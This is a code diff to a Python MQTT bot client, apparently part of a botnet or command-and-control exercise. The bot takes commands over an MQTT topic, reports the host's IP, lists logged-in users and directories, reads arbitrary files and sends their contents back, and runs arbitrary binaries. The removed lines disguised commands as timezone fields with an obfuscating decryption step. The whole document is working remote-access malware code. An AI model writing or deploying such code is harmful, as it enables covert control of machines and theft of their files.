@@ -6,6 +6,7 @@ from common import *
 import subprocess
 import random
 import json
+import socket
 
 DEBUG = True
 
@@ -24,104 +25,90 @@ def on_message(client, userdata, msg):
     try:
         payload = msg.payload.decode()
         data = decode_payload(payload)
-        execute_action(client, data["action"], data["path"])
+        execute_action(client, data)
     except UnknownDeviceError:
         pass  # Ignore messages from unknown devices
     except Exception as ex:
         log(f"Error processing message: {ex}")
 
 
-def decode_payload(payload: str):
+def decode_payload(payload: str) -> ControllerMessage:
     try:
         data = None
         try:
-            data = RequestMessage.from_json(payload)
-        except json.JSONDecodeError:
+            request_msg = RequestMessage.from_json(payload)
+            data = ControllerMessage.from_request(request_msg)
+        except Exception:
             raise UnknownDeviceError()
-        
+    
         log(f"Deserialized payload: {data}")
-
-        if data.timezone is None:
-            raise UnknownDeviceError()
-        
-        action_timezone = data.timezone.upper()
-        if action_timezone not in TIMEZONE_TO_ACTION:
-            raise ValueError(f"Unknown timezone: {action_timezone}")
-
-        action = TIMEZONE_TO_ACTION[action_timezone]
-        path = None
-
-        if data.datetime_leap is not None:
-            encrypted_msg = data.datetime_leap
-            path = do_very_strange_decryption(encrypted_msg)
-        
-        return {
-            "action": action,
-            "path": path
-        }
+        return data
     except UnknownDeviceError as ude:
         raise ude
-    except Exception:
+    except Exception as ex:
+        log(f"Failed to decode payload: {ex}")
         raise Exception("Invalid payload.")
         
 
-def execute_action(client, action: int, path: str = None):
-    response = {
-        MSG_FIELD_TO_FAKE_LEGITIMATE: datetime.now().isoformat()
-    }
+def execute_action(client, data: ControllerMessage):
+    response = RequestMessage()
+    response.set_device_id(client_id)
+    output = None
 
     try:
-        if action == CMD_LIST_BOTS:
-            response[MSG_FIELD_BOT_ID] = client_id
+        if data.user_action == CMD_LIST_BOTS:
+            hostname = socket.gethostname()
+            ip = socket.gethostbyname(hostname)
+            output = ip
 
-        elif action == CMD_LIST_USERS:
+        elif data.user_action == CMD_LIST_USERS:
             # execute 'w' command to list logged in users
             result = subprocess.run(['w'], capture_output=True, text=True, timeout=5000)
-            output_text = result.stdout if result.returncode == 0 else f"Error: {result.stderr}"
-            response.update(encode(output_text))
+            output = result.stdout if result.returncode == 0 else f"Err {result.stderr}"
         
-        elif action == CMD_LIST_DIR:
-            if not path:
-                raise Exception("Missing path.")
+        elif data.user_action == CMD_LIST_DIR:
+            if not data.path:
+                raise Exception("Missing path")
             
-            result = subprocess.run(['ls', path], capture_output=True, text=True, timeout=5000)
-            output = result.stdout if result.returncode == 0 else f"Error: {result.stderr}"
-            response.update(encode(output))
+            result = subprocess.run(['ls', data.path], capture_output=True, text=True, timeout=5000)
+            output = result.stdout if result.returncode == 0 else f"Err {result.stderr}"
             
-        elif action == CMD_GET_USER_ID:
+        elif data.user_action == CMD_GET_USER_ID:
             # execute 'id' command to get user id
             result = subprocess.run(['id'], capture_output=True, text=True, timeout=5000)
-            output = result.stdout if result.returncode == 0 else f"Error: {result.stderr}"
-            response.update(encode(output))
+            output = result.stdout if result.returncode == 0 else f"Err {result.stderr}"
             
-        elif action == CMD_DOWNLOAD_FILE:
-            if not path:
-                raise Exception("Missing path.")
+        elif data.user_action == CMD_DOWNLOAD_FILE:
+            if not data.path:
+                raise Exception("Missing path")
            
-            with open(path, 'r') as file:
-                content = file.read()
-            response.update(encode(content))
+            with open(data.path, 'r') as file:
+                output = file.read()
             
-        elif action == CMD_EXECUTE_BINARY:
-            if not path:
-                raise Exception("Missing path.")
+        elif data.user_action == CMD_EXECUTE_BINARY:
+            if not data.path:
+                raise Exception("Missing path")
         
-            result = subprocess.run([path], capture_output=True, text=True, timeout=5000)
-            output = f"OUT {result.stdout}, ERR {result.stderr}"
-            response.update(encode(output))
-    
+            result = subprocess.run([data.path], capture_output=True, text=True, timeout=5000)
+            output = f"Out {result.stdout}, Err {result.stderr}"
+
+        if output is not None:
+            response.set_message(output)
+
     except FileNotFoundError:
-        response.update(encode(f"{path} not found"))
+        response.set_message(f"{data.path} not found")
     except subprocess.TimeoutExpired:
-        response.update(encode("Timeout"))
+        response.set_message("Timeout")
     except Exception as ex:
-        response.update(encode(str(ex)))
+        response.set_message(str(ex))
         
-    client.publish(MQTT_TOPIC, json.dumps(response))
+    client.publish(MQTT_TOPIC, response.to_json())
+
 
 def log(message):
     if DEBUG:
         print(message)
+
 
 def main():
     # create MQTT client
